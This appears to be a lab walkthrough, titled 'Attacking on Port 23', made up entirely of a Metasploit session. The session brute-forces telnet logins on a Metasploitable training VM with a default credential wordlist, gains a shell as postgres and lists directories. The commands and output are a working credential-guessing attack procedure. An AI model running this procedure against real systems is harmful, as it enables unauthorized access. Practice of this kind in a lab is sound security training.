# Attacking on Port 23

```
msf6 > search telnet_login

Matching Modules
================

   #  Name                                                              Disclosure Date  Rank    Check  Description
   -  ----                                                              ---------------  ----    -----  -----------
   0  auxiliary/admin/http/netgear_pnpx_getsharefolderlist_auth_bypass  2021-09-06       normal  Yes    Netgear PNPX_GetShareFolderList Authentication Bypass
   1  auxiliary/scanner/telnet/telnet_login                             .                normal  No     Telnet Login Check Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/telnet/telnet_login

msf6 > use 1
msf6 auxiliary(scanner/telnet/telnet_login) > show options

Module options (auxiliary/scanner/telnet/telnet_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             23               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.146.132
RHOSTS => 192.168.146.132
msf6 auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/telnet/telnet_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
msf6 auxiliary(scanner/telnet/telnet_login) > run
[!] 192.168.146.132:23    - No active DB -- Credential data will not be saved!
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:root (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: admin:admin (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: test:test (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:matrix (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: ghost:ghost (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: kon:kon (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:ubuntu123 (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: qtss:qtss (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:asdfgh (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: oracle:zxcvbn (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:zxcvbnm (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: test:zxcvbn (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:poiuyt (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:111111 (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: netdump:netdump123 (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: accounts:accounts (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: accounts:123456 (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: internet:123456 (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: judy:judy (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: judy:123456 (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: sam:sam (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:mandriva (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: tiffany:tiffany (Incorrect: )
[-] 192.168.146.132:23    - 192.168.146.132:23 - LOGIN FAILED: root:222222 (Incorrect: )
[+] 192.168.146.132:23    - 192.168.146.132:23 - Login Successful: postgres:postgres
[*] 192.168.146.132:23    - Attempting to start session 192.168.146.132:23 with postgres:postgres
[*] Command shell session 1 opened (192.168.146.130:36935 -> 192.168.146.132:23) at 2025-04-10 16:39:02 -0400
[*] 192.168.146.132:23    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/telnet/telnet_login) > sessions

Active sessions
===============

  Id  Name  Type   Information                                    Connection
  --  ----  ----   -----------                                    ----------
  1         shell  TELNET postgres:postgres (192.168.146.132:23)  192.168.146.130:36935 -> 192.168.146.132:23 (192.168.146.132)

msf6 auxiliary(scanner/telnet/telnet_login) > sessions -i 1
[*] Starting interaction with 1...


postgres@metasploitable:~$ id
id
uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)
postgres@metasploitable:~$ pwd
pwd
/var/lib/postgresql
postgres@metasploitable:~$ ls -la
ls -la
total 16
drwxr-xr-x  3 postgres postgres 4096 2010-03-30 10:29 .
drwxr-xr-x 37 root     root     4096 2012-05-20 14:38 ..
drwxr-xr-x  3 root     root     4096 2010-03-17 10:08 8.3
-rw-------  1 postgres postgres  131 2010-03-30 10:29 .bash_history
postgres@metasploitable:~$ cd 
cd 
postgres@metasploitable:~$ ls -la  
ls -la
total 16
drwxr-xr-x  3 postgres postgres 4096 2010-03-30 10:29 .
drwxr-xr-x 37 root     root     4096 2012-05-20 14:38 ..
drwxr-xr-x  3 root     root     4096 2010-03-17 10:08 8.3
-rw-------  1 postgres postgres  131 2010-03-30 10:29 .bash_history
postgres@metasploitable:~$ cd /
cd /
postgres@metasploitable:/$ ls -la
ls -la
total 89
drwxr-xr-x  21 root root  4096 2012-05-20 14:36 .
drwxr-xr-x  21 root root  4096 2012-05-20 14:36 ..
drwxr-xr-x   2 root root  4096 2012-05-13 23:35 bin
drwxr-xr-x   4 root root  1024 2012-05-13 23:36 boot
lrwxrwxrwx   1 root root    11 2010-04-28 16:26 cdrom -> media/cdrom
drwxr-xr-x  13 root root 13820 2025-04-10 15:12 dev
drwxr-xr-x  94 root root  4096 2025-04-10 16:28 etc
drwxr-xr-x   6 root root  4096 2010-04-16 02:16 home
drwxr-xr-x   2 root root  4096 2010-03-16 18:57 initrd
lrwxrwxrwx   1 root root    32 2010-04-28 16:26 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root  4096 2012-05-13 23:35 lib
drwx------   2 root root 16384 2010-03-16 18:55 lost+found
drwxr-xr-x   4 root root  4096 2010-03-16 18:55 media
drwxr-xr-x   3 root root  4096 2010-04-28 16:16 mnt
-rw-------   1 root root  5821 2025-04-10 15:12 nohup.out
drwxr-xr-x   2 root root  4096 2010-03-16 18:57 opt
dr-xr-xr-x 112 root root     0 2025-04-10 15:11 proc
drwxr-xr-x  13 root root  4096 2025-04-10 15:12 root
drwxr-xr-x   2 root root  4096 2012-05-13 21:54 sbin
drwxr-xr-x   2 root root  4096 2010-03-16 18:57 srv
drwxr-xr-x  12 root root     0 2025-04-10 15:11 sys
drwxrwxrwt   4 root root  4096 2025-04-10 15:12 tmp
drwxr-xr-x  12 root root  4096 2010-04-28 00:06 usr
drwxr-xr-x  14 root root  4096 2010-03-17 10:08 var
lrwxrwxrwx   1 root root    29 2010-04-28 16:21 vmlinuz -> boot/vmlinuz-2.6.24-16-server
postgres@metasploitable:/$ 

```



